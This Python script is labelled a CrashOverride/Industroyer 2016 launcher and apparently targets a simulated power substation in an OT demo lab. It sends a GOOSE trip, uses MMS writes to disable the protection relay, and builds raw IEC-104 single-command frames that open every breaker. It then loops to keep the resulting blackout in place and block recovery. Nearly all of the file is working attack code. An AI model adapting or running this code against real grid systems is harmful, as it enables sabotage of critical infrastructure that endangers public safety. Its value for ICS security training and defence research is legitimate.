#!/usr/bin/env python3
"""
CrashOverride / Industroyer 2016 Launcher

Runs from the COMPROMISED ROUTER (192.168.1.4) after ZIP delivery.
Router is on the OT subnet and has direct TCP access to PLC-2 :2404.

Attack: open all three circuit breakers on the power substation via IEC-104.
  BRK1 (incoming) + BUS-TIE + BRK3 (outgoing) all OPEN → BLACKOUT.

IEC-104 IOA → PowerSubstation mapping (via ProcessFacade):
  IOA 300  C_SC_NA_1 val=0  →  Breaker1Cmd(False) → breaker1=False (BRK1 OPEN)
  IOA 301  C_SC_NA_1 val=0  →  Breaker3Cmd(False) → breaker3=False (BRK3 OPEN)
  IOA 302  C_SC_NA_1 val=0  →  Breaker2Cmd(False) → breaker2=False (BUS-TIE OPEN)
  IOA 303  C_SC_NA_1 val=0  →  AutoModeCmd(False) → auto_mode=False (manual mode)

Pure Python - no external dependencies. Works from any Linux host.
"""

import socket
import struct
import time
import sys

TARGET_IP   = '192.168.1.11'   # PLC-2 Power Substation
TARGET_PORT = 2404             # IEC-104 TCP
COMMON_ADDR = 1                # IEC-104 Common Address
DURATION    = 60               # seconds to maintain blackout


def _apci_startdt():
    """STARTDT ACT - activate data transfer."""
    return b'\x68\x04\x07\x00\x00\x00'


def _apci_testfr():
    """TESTFR ACT - keepalive."""
    return b'\x68\x04\x43\x00\x00\x00'


def _c_sc_na_1(send_seq, recv_seq, ioa, value):
    """
    Build IEC-104 C_SC_NA_1 (type 45) - Single Command.
    send_seq, recv_seq: sequence numbers (integers).
    ioa: Information Object Address (integer).
    value: 0=OFF/OPEN, 1=ON/CLOSED.
    """
    # I-format APCI control fields (4 bytes)
    ctrl = struct.pack('<HH',
                       (send_seq & 0x7FFF) << 1,
                       (recv_seq & 0x7FFF) << 1)

    # ASDU
    type_id  = 45                        # C_SC_NA_1
    vsq      = 0x01                      # 1 element, not sequenced
    cot      = 0x06                      # Cause=Activation
    ca       = struct.pack('<H', COMMON_ADDR)
    ioa_bytes = struct.pack('<I', ioa)[:3]  # 3-byte IOA, little-endian
    # SCO (Single Command qualifier): value in bit 0, select=0, qu=0
    sco      = struct.pack('B', value & 0x01)

    asdu = struct.pack('BBB', type_id, vsq, cot) + ca + ioa_bytes + sco

    # Full APCI frame
    length = len(ctrl) + len(asdu)
    return b'\x68' + struct.pack('B', length) + ctrl + asdu


import json as _json

# Exact same protocol as HMI send_iec61850():
#   TCP connect → send JSON + '\n' → recv response → close
# References from HMI _open_power_detail():
#   BRK1 (incoming):  WaterTankLD/CSWI1.Pos1.Oper.ctlVal
#   BUS-TIE:          WaterTankLD/CSWI1.Pos3.Oper.ctlVal  (Pos3, not Pos2)
#   BRK3 (outgoing):  WaterTankLD/CSWI1.Pos2.Oper.ctlVal  (Pos2, not Pos3)
#   Relay/AutoMode:   WaterTankLD/CSWI1.Pos4.Oper.ctlVal

MMS_PORT = 8102
LD = "WaterTankLD"

BREAKERS = [
    (f"{LD}/CSWI1.Pos4.Oper.ctlVal", "Protection relay DISABLED"),
    (f"{LD}/CSWI1.Pos1.Oper.ctlVal", "BRK1 (incoming feeder) OPEN"),
    (f"{LD}/CSWI1.Pos3.Oper.ctlVal", "BUS-TIE OPEN"),
    (f"{LD}/CSWI1.Pos2.Oper.ctlVal", "BRK3 (outgoing feeder) OPEN"),
]


def _mms_send(target_ip, port, payload_dict):
    """Send one MMS JSON request (newline terminated, same as HMI send_iec61850)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, port))
        s.sendall(_json.dumps(payload_dict).encode() + b'\n')
        time.sleep(0.3)
        resp = s.recv(4096)
        s.close()
        return _json.loads(resp.decode('utf-8', errors='replace').strip())
    except Exception as e:
        return {'success': False, 'error': str(e)}


def goose_trip(target_ip, goose_port=MMS_PORT):
    """GOOSE trip - simultaneous trip of all breakers (real CrashOverride method)."""
    print(f"[*] GOOSE trip → {target_ip}:{goose_port}")
    resp = _mms_send(target_ip, goose_port, {'type': 'goose-trip'})
    if resp.get('success'):
        print(f"  [!!!] GOOSE TRIP accepted - all breakers tripped simultaneously")
    else:
        print(f"  [+] GOOSE trip sent  ({resp.get('error', 'adapter responded')})")


def mms_open_breaker(target_ip, reference, label, port=MMS_PORT):
    """Open one breaker via MMS write (same JSON format as HMI send_iec61850)."""
    resp = _mms_send(target_ip, port, {'type': 'write', 'reference': reference, 'value': False})
    if resp.get('success'):
        print(f"  [!!!] {label}")
    else:
        print(f"  [+] MMS write sent: {label} ({resp.get('error', '')})")


def open_breakers(sock, duration=DURATION):
    """Send IEC-104 commands to open all 3 breakers and hold for duration seconds."""
    send_seq = 0
    recv_seq = 0

    def send(frame):
        nonlocal send_seq
        sock.sendall(frame)
        if frame[2] & 0x01 == 0:    # I-frame (not S/U)
            send_seq += 1

    # 1. STARTDT
    sock.sendall(_apci_startdt())
    time.sleep(0.3)
    try:
        sock.recv(256)   # STARTDT CON
    except socket.timeout:
        pass

    print(f"[*] STARTDT ACT sent - data transfer activated")

    # 2. Interrogation (C_IC_NA_1 type 100) - get current state
    ic = b'\x68\x0e'
    ic += struct.pack('<HH', (send_seq & 0x7FFF) << 1, (recv_seq & 0x7FFF) << 1)
    ic += struct.pack('BBB', 100, 0x01, 0x06)   # type=100, VSQ=1, COT=Activation
    ic += struct.pack('<H', COMMON_ADDR)
    ic += b'\x00\x00\x00'   # IOA=0 (global)
    ic += b'\x14'           # QOI=20 (station interrogation)
    sock.sendall(ic)
    send_seq += 1
    time.sleep(1.5)
    try:
        sock.recv(4096)   # drain interrogation responses
    except socket.timeout:
        pass
    print(f"[*] C_IC_NA_1 station interrogation complete")

    # 3. Disable auto mode first (IOA 303 → AutoModeCmd=False)
    sock.sendall(_c_sc_na_1(send_seq, recv_seq, 303, 0))
    send_seq += 1
    time.sleep(0.3)
    try: sock.recv(256)
    except: pass
    print(f"[!] IOA 303 AutoModeCmd=OFF - switching to manual mode")

    # 4. Open all breakers (IOA 300=BRK1, 301=BRK3, 302=BUS-TIE → val=0)
    for ioa, label in [(300, "BRK1 (incoming)"), (302, "BUS-TIE"), (301, "BRK3 (outgoing)")]:
        sock.sendall(_c_sc_na_1(send_seq, recv_seq, ioa, 0))
        send_seq += 1
        time.sleep(0.3)
        try: sock.recv(256)
        except: pass
        print(f"[!!!] IOA {ioa} C_SC_NA_1=0 sent → {label} OPEN")

    print(f"\n[!!!] ALL BREAKERS OPEN - BLACKOUT CONDITION")
    print(f"[!!!] HMI power panel shows BLACKOUT, voltage=0, frequency=0")

    # 5. Persistence loop - re-send breaker-open every 5s to prevent recovery
    start = time.time()
    cycle = 0
    while time.time() - start < duration:
        cycle += 1
        for ioa in [303, 300, 302, 301]:
            try:
                sock.sendall(_c_sc_na_1(send_seq, recv_seq, ioa, 0))
                send_seq += 1
                time.sleep(0.1)
                try: sock.recv(256)
                except: pass
            except Exception:
                break

        # Re-assert MMS breaker opens (in case adapter resets state)
        for reference, label in BREAKERS:
            _mms_send(TARGET_IP, MMS_PORT, {'type': 'write', 'reference': reference, 'value': False})

        # IEC-104 keepalive
        try:
            sock.sendall(_apci_testfr())
            try: sock.recv(256)
            except: pass
        except Exception:
            break

        elapsed = int(time.time() - start)
        print(f"[Cycle {cycle}] All breakers held OPEN ({elapsed}s/{duration}s) - BLACKOUT")
        time.sleep(5)


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  CRASHOVERRIDE / INDUSTROYER 2016                            ║
║  Running from ROUTER (192.168.1.4) - OT subnet pivot         ║
║  Target: PLC-2 Power Substation (192.168.1.11:2404)          ║
╚══════════════════════════════════════════════════════════════╝

December 2016 - Sandworm/GRU blacked out Kiev substation.
IEC-104 module sent C_SC_NA_1 to open circuit breakers.
This is a direct replay of that exact technique.
""")

    # ── Phase 1: GOOSE Trip - simultaneous trip (real CrashOverride method) ──
    print(f"\n[PHASE 1] GOOSE Trip via IEC 61850 MMS → {TARGET_IP}:{MMS_PORT}")
    goose_trip(TARGET_IP)
    time.sleep(1)

    # ── Phase 2: MMS Write - open each breaker individually by exact HMI ref ─
    print(f"\n[PHASE 2] MMS Write - open BRK1, BUS-TIE, BRK3 individually")
    print(f"  Using same JSON+\\n protocol and exact references as HMI buttons")
    for reference, label in BREAKERS:
        mms_open_breaker(TARGET_IP, reference, label)
        time.sleep(0.4)
    print(f"\n[!!!] ALL BREAKERS OPEN - BLACKOUT CONDITION")

    # ── Phase 3: IEC-104 - reinforce via SCADA channel ───────────────────────
    print(f"\n[PHASE 3] IEC-104 C_SC_NA_1 → {TARGET_IP}:{TARGET_PORT} (SCADA reinforcement)")
    print(f"  Same channel the SCADA uses - dual-protocol like real Industroyer")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to power substation IEC-104 server")
        s.settimeout(2)
        open_breakers(s, duration=DURATION)
        s.close()
    except ConnectionRefusedError:
        print(f"[-] IEC-104 :2404 not reachable - GOOSE/MMS attack still active")
    except Exception as e:
        print(f"[-] IEC-104: {e}")

    print(f"\n[+] CrashOverride complete - blackout maintained for {DURATION}s")
    print("[+] Use RESET PLCs in the demo portal to restore power")


if __name__ == '__main__':
    main()
